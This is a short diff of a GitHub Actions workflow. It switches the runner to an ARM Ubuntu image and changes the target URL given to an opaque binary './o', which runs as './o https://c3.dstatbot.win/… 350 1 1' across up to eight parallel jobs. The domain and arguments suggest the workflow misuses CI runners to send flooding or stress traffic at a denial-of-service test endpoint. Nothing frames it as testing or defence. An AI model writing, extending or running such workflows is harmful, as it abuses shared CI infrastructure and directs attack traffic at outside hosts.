@@ -9,7 +9,7 @@ on:
 
 jobs:
   parallel-execution-ubuntu:
-    runs-on: ubuntu-24.04
+    runs-on: ubuntu-22.04-arm
     strategy:
       max-parallel: 8
       fail-fast: false  # Continue even if some instances fail
@@ -38,7 +38,7 @@ jobs:
           
            
           
-          ./o https://c3.dstatbot.win/L2m140Dr 350 1 1 
+          ./o https://c3.dstatbot.win/YJEfEfYN 350 1 1 
           
 
           
